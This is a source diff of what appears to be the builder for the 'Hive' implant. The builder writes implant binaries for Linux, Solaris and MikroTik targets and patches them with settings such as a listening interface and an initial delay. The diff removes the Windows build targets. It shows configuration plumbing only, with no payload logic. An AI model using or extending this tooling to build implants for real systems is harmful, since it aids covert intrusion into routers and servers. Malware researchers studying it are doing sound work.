@@ -13,8 +13,6 @@
 
 #include "_unpatched_solaris_sparc.h"
 #include "_unpatched_solaris_i386.h"
-#include "_unpatched_windows_i386.h"
-//#include "_unpatched_windows_dll.h"     DISABLED WINDOWS DLL VERSION
 #include "_unpatched_linux_i386.h"
 #include "_unpatched_mikrotik_i386.h"
 #include "_unpatched_mikrotik_mipsbe.h"
@@ -25,9 +23,6 @@
 #include "string_utils.h"
 #include "colors.h"
 
-#define HIVE_WINDOWS_I386_FILE "hived-windows-i386-PATCHED.exe"
-//DISABLED WINDOWS DLL VERSION
-//#define HIVE_WINDOWS_DLL_FILE	"hived-windows-i386-PATCHED.dll"
 #define HIVE_SOLARIS_SPARC_FILE "hived-solaris-sparc-PATCHED"
 #define HIVE_SOLARIS_I386_FILE "hived-solaris-i386-PATCHED"
 #define HIVE_LINUX_I386_FILE "hived-linux-i386-PATCHED"
@@ -36,7 +31,6 @@
 #define HIVE_MIKROTIK_MIPSLE_FILE "hived-mikrotik-mipsle-PATCHED"
 #define HIVE_MIKROTIK_PPC_FILE "hived-mikrotik-ppc-PATCHED"
 
-#define HIVE_WINDOWS_I386_UNPATCHED "hived-windows-i386-UNpatched.exe"
 #define HIVE_SOLARIS_SPARC_UNPATCHED "hived-solaris-sparc-UNpatched"
 #define HIVE_SOLARIS_I386_UNPATCHED "hived-solaris-i386-UNpatched"
 #define HIVE_LINUX_I386_UNPATCHED "hived-linux-i386-UNpatched"
@@ -99,7 +93,6 @@ int usage( char **argv )
    fprintf(stdout, "                         * 'all' - default\n" );
    fprintf(stdout, "                         * 'raw' - all unpatched\n" );
    fprintf(stdout, "                         * 'win'\n" );
-   //   fprintf(stdout, "                         * 'dll-win'\n" );       DISABLED WINDOWS DLL VERSION
    fprintf(stdout, "                         * 'mt-x86'\n" );
    fprintf(stdout, "                         * 'mt-mipsbe'\n" );
    fprintf(stdout, "                         * 'mt-mipsle'\n" );
@@ -138,17 +131,15 @@ int main( int argc, char **argv )
 {
 	int				optval;
 	//struct in_addr	addr_check;
-	int				windows = 0;			// Windows x86
-	int				windows_dll = 0;		// Windows DLL  (0 means disabled) DISABLED WINDOWS DLL VERSION
-	int				linux_x86 = 0;			// Linux x86
-	int				solaris_sparc = 0;		// Solaris SPARC
-	int				solaris_x86 = 0;		// Solaris x86
-	int				mikrotik_x86 = 0;		// MikroTik x86
+	int				linux_x86 = 0;		// Linux x86
+	int				solaris_sparc = 0;	// Solaris SPARC
+	int				solaris_x86 = 0;	// Solaris x86
+	int				mikrotik_x86 = 0;	// MikroTik x86
 	int				mikrotik_mipsbe = 0;	// MikroTik MIPS Big Endian
 	int				mikrotik_mipsle = 0;	// MikroTik MIPS Little Endian
-	int				mikrotik_ppc = 0;		// MikroTik PowerPC [Big Endian]
+	int				mikrotik_ppc = 0;	// MikroTik PowerPC [Big Endian]
 	int				raw = 0; 		// unpatched versions
-	char			*host = (char *)NULL;	// cached hostname for user confirmation message
+	char				*host = (char *)NULL;	// cached hostname for user confirmation message
 
 	args.patched = 1;
 	args.init_delay = DEFAULT_INITIAL_DELAY;
@@ -163,19 +154,9 @@ int main( int argc, char **argv )
     {
         switch( optval )
         {
-			// operating system: valid linux, solaris, windows, all, or raw
+			// operating system: valid linux, solaris, all, or raw
             case 'm':
-				if ( strncmp( optarg, "w", 1 ) == 0 )
-				{
-					// windows
-					windows = 1;
-				}
-				//DISABLED WINDOWS DLL VERSION
-				//else if ( strncmp( optarg, "d", 1 ) == 0 )
-				//{
-				//	windows_dll = 1;
-				//}
-				else if ( strncmp( optarg, "mt-p", 4 ) == 0 )
+        	    	    	if ( strncmp( optarg, "mt-p", 4 ) == 0 )
 				{
 					// mikrotik powerpc
 					mikrotik_ppc = 1;
@@ -212,9 +193,6 @@ int main( int argc, char **argv )
 				}
 				else if ( strncmp( optarg, "a", 1 ) == 0 )
 				{
-					// all
-					windows = 1;
-					windows_dll = 0;	//DISABLED WINDOWS DLL VERSION
 					solaris_sparc = 1;
 					linux_x86 = 1;
 					solaris_x86 = 1;
@@ -335,11 +313,8 @@ int main( int argc, char **argv )
 			return -1;
 		}
 
-		//if ( ( windows == 0 ) && ( windows_dll == 0) && ( linux_x86 == 0 ) && ( solaris_sparc == 0 ) && ( solaris_x86 == 0 ) && ( mikrotik_x86 == 0 ) && ( mikrotik_mipsbe == 0 ) && ( mikrotik_ppc == 0 ) && ( mikrotik_mipsle == 0 ) )
-		if ( ( windows == 0 ) && ( linux_x86 == 0 ) && ( solaris_sparc == 0 ) && ( solaris_x86 == 0 ) && ( mikrotik_x86 == 0 ) && ( mikrotik_mipsbe == 0 ) && ( mikrotik_ppc == 0 ) && ( mikrotik_mipsle == 0 ) )
+		if ( ( linux_x86 == 0 ) && ( solaris_sparc == 0 ) && ( solaris_x86 == 0 ) && ( mikrotik_x86 == 0 ) && ( mikrotik_mipsbe == 0 ) && ( mikrotik_ppc == 0 ) && ( mikrotik_mipsle == 0 ) )
 		{	// no OS was selected, so default is to build all
-			windows = 1;
-			windows_dll = 0;	//DISABLED WINDOWS DLL VERSION
 			solaris_sparc = 1;
 			linux_x86 = 1;
 			solaris_x86 = 1;
@@ -373,58 +348,49 @@ int main( int argc, char **argv )
 
 	if ( solaris_sparc == 1  || solaris_x86 == 1 )
 	{
-	printf( "   . Listening Interface         -> %s     (Solaris Only)\n", args.iface );
+		printf( "   . Listening Interface         -> %s     (Solaris Only)\n", args.iface );
 	}
 
 	printf( "\n" );
 	printf( "  Target Operating Systems:\n" );
 
 	// little endian systems targets
-	if ( windows == 1 || raw == 1 )
-	{
-	printf( "   . Windows/x86\n" );
-	}
-
-	//DISABLED WINDOWS DLL VERSION
-	if ( windows_dll == 1)
-	{
-		printf( "   . Windows/DLL HAS BEEN DISABLED, THIS SHOULD NEVER PRINT.\n" );
-	}
 
 	if ( linux_x86 == 1 || raw == 1 )
 	{
-	printf( "   . Linux/x86\n" );
+		printf( "   . Linux/x86\n" );
 	}
 
 	if ( solaris_sparc == 1 || raw == 1 )
 	{
-	printf( "   . Solaris/SPARC\n" );
+		printf( "   . Solaris/SPARC\n" );
 	}
 
 	if ( solaris_x86 == 1 || raw == 1 )
 	{
-	printf( "   . Solaris/x86\n" );
+		printf( "   . Solaris/x86\n" );
 	}
 
 	if ( mikrotik_x86 == 1 || raw == 1 )
 	{
-	printf( "   . MikroTik/x86\n" );
+		printf( "   . MikroTik/x86\n" );
 	}
 
 	if ( mikrotik_mipsle == 1 || raw == 1 )
 	{
-	printf( "   . MikroTik/MIPS-LE\n" );
+		printf( "   . MikroTik/MIPS-LE\n" );
 	}
 
 	// beginning of big endian targets
+
 	if ( mikrotik_mipsbe == 1 || raw == 1 )
 	{
-	printf( "   . MikroTik/MIPS-BE\n" );
+		printf( "   . MikroTik/MIPS-BE\n" );
 	}
 
 	if ( mikrotik_ppc == 1 || raw == 1 )
 	{
-	printf( "   . MikroTik/PPC\n" );
+		printf( "   . MikroTik/PPC\n" );
 	}
 
 	if ( raw == 0 )
@@ -433,9 +399,6 @@ int main( int argc, char **argv )
 		cl_string( (unsigned char *)args.iface, sizeof( args.iface ) );
 	}
 
-#if 0
-	remove( HIVE_WINDOWS_I386_FILE );
-//	remove( HIVE_WINDOWS_DLL_FILE );
 	remove( HIVE_SOLARIS_SPARC_FILE );
 	remove( HIVE_SOLARIS_I386_FILE );
 	remove( HIVE_LINUX_I386_FILE );
@@ -444,7 +407,6 @@ int main( int argc, char **argv )
 	remove( HIVE_MIKROTIK_MIPSLE_FILE );
 	remove( HIVE_MIKROTIK_PPC_FILE );
 
-	remove( HIVE_WINDOWS_I386_UNPATCHED );
 	remove( HIVE_SOLARIS_SPARC_UNPATCHED );
 	remove( HIVE_SOLARIS_I386_UNPATCHED );
 	remove( HIVE_LINUX_I386_UNPATCHED );
@@ -452,18 +414,15 @@ int main( int argc, char **argv )
 	remove( HIVE_MIKROTIK_MIPSBE_UNPATCHED );
 	remove( HIVE_MIKROTIK_MIPSLE_UNPATCHED );
 	remove( HIVE_MIKROTIK_PPC_UNPATCHED );
-#endif
+
 
 	sleep( 1 );
 
 //    local_gen_keys( PUBKEYFILE, PRIVKEYFILE, KEY_SIZE );
 
-//	patch( HIVE_WINDOWS_I386_FILE, bin_tb, bin_tb_len );
-
 	if ( raw == 1 )
 	{
 		printf( "\n" );
-		non_patch( HIVE_WINDOWS_I386_UNPATCHED, hived_windows_i386_unpatched_exe, hived_windows_i386_unpatched_exe_len );
 		non_patch( HIVE_LINUX_I386_UNPATCHED, hived_linux_i386_unpatched, hived_linux_i386_unpatched_len );
 		non_patch( HIVE_SOLARIS_SPARC_UNPATCHED, hived_solaris_sparc_unpatched, hived_solaris_sparc_unpatched_len );
 		non_patch( HIVE_SOLARIS_I386_UNPATCHED, hived_solaris_i386_unpatched, hived_solaris_i386_unpatched_len );
@@ -476,16 +435,6 @@ int main( int argc, char **argv )
 // We start as Little Endian.  If the binary is detected as Big Endian, then the structure
 // is changed to Big Endian.  Since these changes are made in a global variable used by all
 // parsers, check for Little Endian variants first and the Big Endian possibilities next.
-	if ( windows == 1 )
-	{
-		patch( HIVE_WINDOWS_I386_FILE, hived_windows_i386_unpatched_exe, hived_windows_i386_unpatched_exe_len, args );
-	}
-
-//DISABLED WINDOWS DLL VERSION
-//if ( windows_dll == 1)
-//	{
-//		patch( HIVE_WINDOWS_DLL_FILE, hived_windows_i386_unpatched_dll, hived_windows_i386_unpatched_dll_len,args);
-//	}
 
 	if ( linux_x86 == 1 )
 	{
